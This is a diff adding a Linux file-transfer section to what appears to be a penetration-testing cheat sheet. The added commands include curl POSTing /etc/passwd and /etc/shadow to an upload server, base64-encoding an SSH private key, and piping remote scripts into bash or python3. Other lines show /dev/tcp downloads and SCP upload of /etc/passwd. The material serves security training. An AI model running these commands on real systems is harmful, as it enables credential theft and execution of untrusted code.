@@ -994,3 +994,116 @@ ftp> USER anonymous
 ftp> PUT c:\windows\system32\drivers\etc\hosts
 ftp> bye
 ```
+## Linux File Transfers
+### Base64 Encode & Decode
+1. **Check MD5 Hash**
+```bash
+md5sum id_rsa
+```
+2. **Encode SSH Key to Base64**
+```bash
+cat id_rsa |base64 -w 0;echo
+```
+3. **Decode the File**
+```bash
+echo -n 'justimaginethisissomerandomhashbecauseyoudontcareandidontcare=` | base64 -d > id_rsa
+```
+
+### Web Downloads with Wget and cURL
+1. **Download a File Using wget**
+```bash
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+```
+2. **Download a File Using cURL**
+```bash
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+```
+
+### Web Upload
+Mechanism is similar to Windows web upload using `uploadserver` module:
+```bash
+sudo python3 -m pip install --user uploadserver
+```
+#### Secure HTTPS Web Server
+1. **Start Web Server**
+```bash
+sudo python3 -m pip install --user uploadserver
+```
+2. **Create a Self-Signed Certificate**
+```bash
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+3. **Start Web Server**
+```bash
+mkdir https && cd https
+```
+```bash
+sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
+```
+- **Upload Multiple Files**
+```bash
+curl -X POST https://{IP}/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+#### Alternative File Transfer Method
+- **Creating a Web Server with Python3**
+```bash
+python3 -m http.server
+```
+- **Creating a Web Server with Python2.7**
+```bash
+python2.7 -m SimpleHTTPServer
+```
+- **Creating a Web Server with PHP**
+```bash
+php -S 0.0.0.0:8000
+```
+- **Creating a Web Server with Ruby**
+```bash
+ruby -run -ehttpd . -p8000
+```
+
+### Fileless Attacks Using Linux
+1. **Fileless Download with cURL**
+```bash
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+```
+2. **Fileless Download with wget**
+```bash
+ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
+### Download with Bash(/dev/tcp)
+1. **Connect to the Target Webserver**
+```bash
+exec 3<>/dev/tcp/10.10.10.32/80
+```
+2. **HTTP GET Request**
+```bash
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+```
+3. **Print the Response**
+```bash
+cat <&3
+```
+### SCP Download
+`SSH` is a protocol that allows secure access to remote computers. And we could use `SCP`  utility which uses SSH protocol for transferring files
+1. **Enabling the SSH Server**
+```bash
+sudo systemctl enable ssh
+```
+2. **Starting the SSH Server**
+```bash
+sudo systemctl start ssh
+```
+3. **Checking for SSH Listening Port**
+```bash
+netstat -lnpt
+```
+4. **Linux - Downloading Files Using SCP**
+```bash
+scp plaintext@192.168.49.128:/root/myroot.txt .
+```
+### SCP Upload
+- **File Upload with SCP**
+```bash
+scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
+```
